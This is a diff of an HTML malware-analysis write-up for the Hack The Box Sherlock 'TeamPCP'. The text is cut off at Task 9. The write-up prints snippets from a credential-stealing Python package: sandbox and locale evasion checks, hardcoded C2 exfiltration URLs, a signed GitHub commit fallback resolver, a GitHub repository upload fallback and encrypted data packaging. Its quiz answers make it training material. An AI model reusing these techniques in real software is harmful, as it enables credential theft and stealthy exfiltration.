@@ -1,21 +1,552 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>TeamPCP — HTB Sherlock Write-up</title><meta name="description" content="Examining a Python package built to collect credentials, exfiltrate data and install a secondary payload."><meta name="theme-color" content="#0c0d10"><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="/about.css"><link rel="stylesheet" href="/projects.css"><link rel="stylesheet" href="/research.css"><link rel="stylesheet" href="/theme.css"><link rel="canonical" href="https://sacitcinar.github.io/write-ups/teampcp/"><link rel="icon" href="/assets/brand/sacit-cinar-castle.svg?v=bright2" type="image/svg+xml"><link rel="icon" href="/favicon-32.png?v=castle4" sizes="32x32" type="image/png"><link rel="shortcut icon" href="/favicon.ico?v=castle4"><link rel="stylesheet" href="/cheat-sheets.css"><link rel="stylesheet" href="/typography.css"><link rel="stylesheet" href="/palette.css"></head><body data-section-page="writeups"><header class="site-header"><div class="header-inner"><a class="brand" data-section="home" href="/index.html" aria-label="Sacit Çınar — About"><span class="brand-mark" aria-hidden="true"><img src="/assets/brand/sacit-cinar-castle.svg?v=bright2" width="34" height="36" alt="" aria-hidden="true"></span><span class="brand-copy"><span class="brand-name">Sacit Çınar</span><span class="brand-prompt">dominic@kali:~$<span class="terminal-cursor" aria-hidden="true"></span></span></span></a><nav aria-label="Main navigation"><a href="/index.html" data-section="home">About</a><a href="/research.html" data-section="research">Research</a><a href="/projects.html" data-section="projects">Projects</a><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page">Write-ups</a><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a></nav></div></header><main class="projects-main research-detail writeup-detail"><a class="project-return" data-section="writeups" href="/write-ups.html">← All write-ups</a><section class="research-hero"><div class="project-meta"><span class="project-badge badge-htb">HTB</span><span class="project-badge">SHERLOCK</span><span class="project-badge">MALWARE ANALYSIS</span></div><h1>TeamPCP</h1><p class="research-deck">Examining a Python package built to collect credentials, exfiltrate data and install a secondary payload.</p><p class="research-byline">By Mehmet Sacit Çınar · <time datetime="2026-10-18">18 October 2026</time></p></section><div class="research-layout"><aside class="article-toc"><p>IN THIS WRITE-UP</p><nav aria-label="Table of contents"><a href="#overview">Overview</a><a href="#task-1">Task 1 · Operating System Check</a><a href="#task-2">Task 2 · Excluded Locale Prefix</a><a href="#task-3">Task 3 · CPU Threshold</a><a href="#task-4">Task 4 · Activation Marker</a><a href="#task-5">Task 5 · Primary C2 Address</a><a href="#task-6">Task 6 · GitHub Fallback Keyword</a><a href="#task-7">Task 7 · Repository Naming Word</a><a href="#task-8">Task 8 · Compression Module</a><a href="#task-9">Task 9 · Symmetric Encryption</a><a href="#task-10">Task 10 · Session Key Encryption</a><a href="#task-11">Task 11 · Systemd Unit Filename</a><a href="#task-12">Task 12 · Dropped Python Filename</a><a href="#task-13">Task 13 · Wiper Die Roll</a><a href="#task-14">Task 14 · Destructive Command</a><a href="#task-15">Task 15 · Password Manager Keys</a><a href="#how-the-package-works">How the Package Works</a></nav></aside><article class="research-copy writeup-copy"><h2 id="overview">Overview</h2><p>The suspicious package presents itself as a CI/CD helper library. Its source contains environment checks, credential collectors, encrypted data transfers and a secondary payload handler.</p><p>The analysis follows the code without executing the package. The main files are <code>__main__.py</code>, <code>entrypoint.py</code>, <code>roulette.py</code> and the modules under <code>collectors/</code> and <code>utilities/</code>.</p><section class="autoit-task" id="task-1"><h2><span class="task-number">Task 1</span> — Operating System Check</h2><p class="task-question">What exact string does the script compare sys.platform against?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>linux</code></p><p>The first guard in <code>__main__.py</code> is:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-1"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-1"><code>if sys.platform not in (&#x27;linux&#x27;):
-    sys.exit(1)</code></pre></div><p>On a normal Linux installation, <code>sys.platform</code> returns <code>linux</code>, allowing execution to continue. There is a small implementation detail: <code>('linux')</code> is a string, not a tuple. The expression therefore performs substring membership rather than comparing against a one-element tuple.</p></div></details></section><section class="autoit-task" id="task-2"><h2><span class="task-number">Task 2</span> — Excluded Locale Prefix</h2><p class="task-question">What two-character prefix causes the script to exit when found at the beginning of LANG?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>ru</code></p><p>The script reads <code>LANG</code>, removes the encoding suffix and checks its lowercase value:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-2"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-2"><code>    lang = os.environ.get(&#x27;LANG&#x27;, &#x27;&#x27;).split(&#x27;.&#x27;)[0]
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>TeamPCP — HTB Sherlock Write-up</title>
+    <meta
+      name="description"
+      content="Examining a Python package built to collect credentials, exfiltrate data and install a secondary payload."
+    />
+    <meta name="theme-color" content="#0c0d10" />
+    <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="/about.css" />
+    <link rel="stylesheet" href="/projects.css" />
+    <link rel="stylesheet" href="/research.css" />
+    <link rel="stylesheet" href="/theme.css" />
+    <link
+      rel="canonical"
+      href="https://sacit-security-portfolio.dmncdcco.chatgpt.site/write-ups/teampcp/"
+    />
+    <link
+      rel="icon"
+      href="/assets/brand/sacit-cinar-castle.svg?v=castle-original7"
+      type="image/svg+xml"
+    />
+    <link rel="icon" href="/favicon-32.png?v=castle-original7" sizes="32x32" type="image/png" />
+    <link rel="shortcut icon" href="/favicon.ico?v=castle-original7" />
+    <link rel="stylesheet" href="/cheat-sheets.css" />
+    <link rel="stylesheet" href="/typography.css" />
+    <link rel="stylesheet" href="/palette.css" />
+    <link rel="stylesheet" href="/i18n.css" />
+    <script src="/i18n.js" defer></script>
+  </head>
+  <body data-section-page="writeups">
+    <header class="site-header">
+      <div class="header-inner">
+        <a class="brand" data-section="home" href="/index.html" aria-label="Sacit Çınar — About"
+          ><span class="brand-mark" aria-hidden="true"
+            ><img
+              src="/assets/brand/sacit-cinar-castle.svg?v=castle-original7"
+              width="34"
+              height="36"
+              alt=""
+              aria-hidden="true" /></span
+          ><span class="brand-copy"
+            ><span class="brand-name">sacit çınar</span
+            ><span class="brand-prompt"
+              >dominic@kali:~$<span class="terminal-cursor" aria-hidden="true"></span></span></span
+        ></a>
+        <nav aria-label="Main navigation">
+          <a href="/index.html" data-section="home">About</a
+          ><a href="/research.html" data-section="research">Research</a
+          ><a href="/projects.html" data-section="projects">Projects</a
+          ><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page"
+            >Write-ups</a
+          ><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a
+          ><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a>
+        </nav>
+      </div>
+    </header>
+    <main class="projects-main research-detail writeup-detail">
+      <a class="project-return" data-section="writeups" href="/write-ups.html">← All write-ups</a>
+      <section class="research-hero">
+        <div class="project-meta">
+          <span class="project-badge badge-htb">HTB</span><span class="project-badge">SHERLOCK</span
+          ><span class="project-badge">MALWARE ANALYSIS</span>
+        </div>
+        <h1>TeamPCP</h1>
+        <p class="research-deck">
+          Examining a Python package built to collect credentials, exfiltrate data and install a
+          secondary payload.
+        </p>
+        <p class="research-byline">
+          By Mehmet Sacit Çınar · <time datetime="2026-10-18">18 October 2026</time>
+        </p>
+      </section>
+      <div class="research-layout">
+        <aside class="article-toc">
+          <p>IN THIS WRITE-UP</p>
+          <nav aria-label="Table of contents">
+            <a href="#overview">Overview</a><a href="#task-1">Task 1 · Operating System Check</a
+            ><a href="#task-2">Task 2 · Excluded Locale Prefix</a
+            ><a href="#task-3">Task 3 · CPU Threshold</a
+            ><a href="#task-4">Task 4 · Activation Marker</a
+            ><a href="#task-5">Task 5 · Primary C2 Address</a
+            ><a href="#task-6">Task 6 · GitHub Fallback Keyword</a
+            ><a href="#task-7">Task 7 · Repository Naming Word</a
+            ><a href="#task-8">Task 8 · Compression Module</a
+            ><a href="#task-9">Task 9 · Symmetric Encryption</a
+            ><a href="#task-10">Task 10 · Session Key Encryption</a
+            ><a href="#task-11">Task 11 · Systemd Unit Filename</a
+            ><a href="#task-12">Task 12 · Dropped Python Filename</a
+            ><a href="#task-13">Task 13 · Wiper Die Roll</a
+            ><a href="#task-14">Task 14 · Destructive Command</a
+            ><a href="#task-15">Task 15 · Password Manager Keys</a
+            ><a href="#how-the-package-works">How the Package Works</a>
+          </nav>
+        </aside>
+        <article class="research-copy writeup-copy">
+          <h2 id="overview">Overview</h2>
+          <p>
+            The suspicious package presents itself as a CI/CD helper library. Its source contains
+            environment checks, credential collectors, encrypted data transfers and a secondary
+            payload handler.
+          </p>
+          <p>
+            The analysis follows the code without executing the package. The main files are
+            <code>__main__.py</code>, <code>entrypoint.py</code>, <code>roulette.py</code> and the
+            modules under <code>collectors/</code> and <code>utilities/</code>.
+          </p>
+          <section class="autoit-task" id="task-1">
+            <h2><span class="task-number">Task 1</span> — Operating System Check</h2>
+            <p class="task-question">
+              What exact string does the script compare sys.platform against?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>linux</code></p>
+                <p>The first guard in <code>__main__.py</code> is:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-1"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-1"><code>if sys.platform not in (&#x27;linux&#x27;):
+    sys.exit(1)</code></pre>
+                </div>
+                <p>
+                  On a normal Linux installation, <code>sys.platform</code> returns
+                  <code>linux</code>, allowing execution to continue. There is a small
+                  implementation detail: <code>('linux')</code> is a string, not a tuple. The
+                  expression therefore performs substring membership rather than comparing against a
+                  one-element tuple.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-2">
+            <h2><span class="task-number">Task 2</span> — Excluded Locale Prefix</h2>
+            <p class="task-question">
+              What two-character prefix causes the script to exit when found at the beginning of
+              LANG?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>ru</code></p>
+                <p>
+                  The script reads <code>LANG</code>, removes the encoding suffix and checks its
+                  lowercase value:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-2"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-2"
+                  ><code>    lang = os.environ.get(&#x27;LANG&#x27;, &#x27;&#x27;).split(&#x27;.&#x27;)[0]
     if lang.lower().startswith(&#x27;ru&#x27;):
-        sys.exit(1)</code></pre></div><p>For example, <code>ru_RU.UTF-8</code> becomes <code>ru_RU</code> and matches the prefix. This is an execution filter based on locale. It does not establish the operator’s identity or nationality.</p></div></details></section><section class="autoit-task" id="task-3"><h2><span class="task-number">Task 3</span> — CPU Threshold</h2><p class="task-question">What integer value is used as the CPU threshold?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>4</code></p><p>The next guard checks the CPU count:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-3"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-3"><code>if os.cpu_count() is None or os.cpu_count() &lt;= 4:
-    sys.exit(1)</code></pre></div><p>Execution stops if the count is unavailable or is four or fewer. The package therefore requires a reported count greater than four to pass this check.</p></div></details></section><section class="autoit-task" id="task-4"><h2><span class="task-number">Task 4</span> — Activation Marker</h2><p class="task-question">What is the full absolute path of the two-stage activation marker?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>/tmp/.transformers</code></p><p>The marker is defined in <code>__main__.py</code>:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-4"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-4"><code>INIT_MARKER = Path(&#x27;/tmp/.transformers&#x27;)</code></pre></div><p>When the package runs as the main module, it checks for that file:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-5"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-5"><code>    if not INIT_MARKER.exists():
+        sys.exit(1)</code></pre>
+                </div>
+                <p>
+                  For example, <code>ru_RU.UTF-8</code> becomes <code>ru_RU</code> and matches the
+                  prefix. This is an execution filter based on locale. It does not establish the
+                  operator’s identity or nationality.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-3">
+            <h2><span class="task-number">Task 3</span> — CPU Threshold</h2>
+            <p class="task-question">What integer value is used as the CPU threshold?</p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>4</code></p>
+                <p>The next guard checks the CPU count:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-3"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-3"
+                  ><code>if os.cpu_count() is None or os.cpu_count() &lt;= 4:
+    sys.exit(1)</code></pre>
+                </div>
+                <p>
+                  Execution stops if the count is unavailable or is four or fewer. The package
+                  therefore requires a reported count greater than four to pass this check.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-4">
+            <h2><span class="task-number">Task 4</span> — Activation Marker</h2>
+            <p class="task-question">
+              What is the full absolute path of the two-stage activation marker?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>/tmp/.transformers</code></p>
+                <p>The marker is defined in <code>__main__.py</code>:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-4"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-4"
+                  ><code>INIT_MARKER = Path(&#x27;/tmp/.transformers&#x27;)</code></pre>
+                </div>
+                <p>When the package runs as the main module, it checks for that file:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-5"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-5"><code>    if not INIT_MARKER.exists():
         try:
             INIT_MARKER.touch()
         except Exception:
             pass
-        sys.exit(1)</code></pre></div><p>If the marker is absent, the script attempts to create it and exits. On a later run, an existing marker allows execution to proceed to the next stage.</p></div></details></section><section class="autoit-task" id="task-5"><h2><span class="task-number">Task 5</span> — Primary C2 Address</h2><p class="task-question">What IP address is shared by the two hardcoded C2 URLs?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>83.142.209.194</code></p><p><code>entrypoint.py</code> defines two endpoints:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-6"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-6"><code>_EARLY_QUARANTINE_URL = &quot;https://83.142.209.194/v1/models&quot;
-_TARGET_URL = &quot;https://83.142.209.194/v1/weights&quot;</code></pre></div><p>The first endpoint is contacted before credential collection. A successful HTTP 200 response is read and passed to <code>roulette.collect()</code> as a Base64 payload. The second endpoint is the default destination for the packaged collection results.</p></div></details></section><section class="autoit-task" id="task-6"><h2><span class="task-number">Task 6</span> — GitHub Fallback Keyword</h2><p class="task-question">What uppercase keyword identifies fallback C2 information in GitHub commit messages?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>FIRESCALE</code></p><p>The parser uses this regular expression:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-7"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-7"><code>_FIRESCALE_RE = re.compile(r&#x27;FIRESCALE\s+([A-Za-z0-9+/=]+)\.([A-Za-z0-9+/=]+)&#x27;)</code></pre></div><p>The resolver searches public GitHub commits for <code>FIRESCALE</code>. Matching messages contain a Base64-encoded URL and a signature separated by a dot. Before accepting the decoded URL, the code verifies the signature over the encoded URL string:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-8"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-8"><code>            if rsa_verify_sha256(_PUBLIC_KEY_PEM, b64_url.encode(), sig_bytes):
-                return url_bytes.decode().strip()</code></pre></div><p>This lets the operator publish a replacement destination without changing the address embedded in the package.</p></div></details></section><section class="autoit-task" id="task-7"><h2><span class="task-number">Task 7</span> — Repository Naming Word</h2><p class="task-question">What is the first word in the hardcoded repository naming list?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>BABA-YAGA</code></p><p>Inside <code>upload_to_github()</code>, the list begins with:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-9"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-9"><code>    wordy_words = [
+        sys.exit(1)</code></pre>
+                </div>
+                <p>
+                  If the marker is absent, the script attempts to create it and exits. On a later
+                  run, an existing marker allows execution to proceed to the next stage.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-5">
+            <h2><span class="task-number">Task 5</span> — Primary C2 Address</h2>
+            <p class="task-question">What IP address is shared by the two hardcoded C2 URLs?</p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>83.142.209.194</code></p>
+                <p><code>entrypoint.py</code> defines two endpoints:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-6"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-6"
+                  ><code>_EARLY_QUARANTINE_URL = &quot;https://83.142.209.194/v1/models&quot;
+_TARGET_URL = &quot;https://83.142.209.194/v1/weights&quot;</code></pre>
+                </div>
+                <p>
+                  The first endpoint is contacted before credential collection. A successful HTTP
+                  200 response is read and passed to <code>roulette.collect()</code> as a Base64
+                  payload. The second endpoint is the default destination for the packaged
+                  collection results.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-6">
+            <h2><span class="task-number">Task 6</span> — GitHub Fallback Keyword</h2>
+            <p class="task-question">
+              What uppercase keyword identifies fallback C2 information in GitHub commit messages?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>FIRESCALE</code></p>
+                <p>The parser uses this regular expression:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-7"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-7"
+                  ><code>_FIRESCALE_RE = re.compile(r&#x27;FIRESCALE\s+([A-Za-z0-9+/=]+)\.([A-Za-z0-9+/=]+)&#x27;)</code></pre>
+                </div>
+                <p>
+                  The resolver searches public GitHub commits for <code>FIRESCALE</code>. Matching
+                  messages contain a Base64-encoded URL and a signature separated by a dot. Before
+                  accepting the decoded URL, the code verifies the signature over the encoded URL
+                  string:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-8"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-8"
+                  ><code>            if rsa_verify_sha256(_PUBLIC_KEY_PEM, b64_url.encode(), sig_bytes):
+                return url_bytes.decode().strip()</code></pre>
+                </div>
+                <p>
+                  This lets the operator publish a replacement destination without changing the
+                  address embedded in the package.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-7">
+            <h2><span class="task-number">Task 7</span> — Repository Naming Word</h2>
+            <p class="task-question">
+              What is the first word in the hardcoded repository naming list?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>BABA-YAGA</code></p>
+                <p>Inside <code>upload_to_github()</code>, the list begins with:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-9"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-9"><code>    wordy_words = [
         &quot;BABA-YAGA&quot;, &quot;KOSCHEI&quot;, &quot;FIREBIRD&quot;, &quot;PTITSA&quot;, &quot;TSAREVICH&quot;,
-        &quot;VASSILISA&quot;, &quot;LESHY&quot;, &quot;DOMOVOI&quot;, &quot;RUSALKA&quot;, &quot;SAMOVAR&quot;,</code></pre></div><p>The repository name combines two randomly selected list entries with a three-digit number:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-10"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-10"><code>    repo_name = f&quot;{random.choice(wordy_words)}-{random.choice(wordy_words)}-{random.randint(100, 999)}&quot;</code></pre></div><p>If the normal upload fails and a GitHub token is found in the collected data, the code attempts to create a public repository and upload <code>results.json</code>.</p></div></details></section><section class="autoit-task" id="task-8"><h2><span class="task-number">Task 8</span> — Compression Module</h2><p class="task-question">Which standard Python library module compresses the collected data before encryption?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>gzip</code></p><p>The first operation in <code>_build_package()</code> serializes the results to JSON, encodes them as bytes and compresses them:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-11"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-11"><code>    compressed = gzip.compress(json.dumps(data).encode())</code></pre></div><p>Compression occurs before the encryption step.</p></div></details></section><section class="autoit-task" id="task-9"><h2><span class="task-number">Task 9</span> — Symmetric Encryption</h2><p class="task-question">What symmetric algorithm, key size and mode protect the compressed data?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>AES-256-GCM</code></p><p><code>entrypoint.py</code> generates a 32-byte session key and a 12-byte initialization vector:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-12"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-12"><code>    aes_key = os.urandom(32)
-    iv = os.urandom(12)</code></pre></div><p>A 32-byte key contains 256 bits. The implementation in <code>utilities/crypto.py</code> confirms AES in GCM mode:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>utilities/crypto.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-13"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-13"><code>def aes_256_gcm_encrypt(key: bytes, iv: bytes, plaintext: bytes) -&gt; tuple[bytes, bytes]:
+        &quot;VASSILISA&quot;, &quot;LESHY&quot;, &quot;DOMOVOI&quot;, &quot;RUSALKA&quot;, &quot;SAMOVAR&quot;,</code></pre>
+                </div>
+                <p>
+                  The repository name combines two randomly selected list entries with a three-digit
+                  number:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-10"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-10"
+                  ><code>    repo_name = f&quot;{random.choice(wordy_words)}-{random.choice(wordy_words)}-{random.randint(100, 999)}&quot;</code></pre>
+                </div>
+                <p>
+                  If the normal upload fails and a GitHub token is found in the collected data, the
+                  code attempts to create a public repository and upload <code>results.json</code>.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-8">
+            <h2><span class="task-number">Task 8</span> — Compression Module</h2>
+            <p class="task-question">
+              Which standard Python library module compresses the collected data before encryption?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>gzip</code></p>
+                <p>
+                  The first operation in <code>_build_package()</code> serializes the results to
+                  JSON, encodes them as bytes and compresses them:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-11"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-11"
+                  ><code>    compressed = gzip.compress(json.dumps(data).encode())</code></pre>
+                </div>
+                <p>Compression occurs before the encryption step.</p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-9">
+            <h2><span class="task-number">Task 9</span> — Symmetric Encryption</h2>
+            <p class="task-question">
+              What symmetric algorithm, key size and mode protect the compressed data?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>AES-256-GCM</code></p>
+                <p>
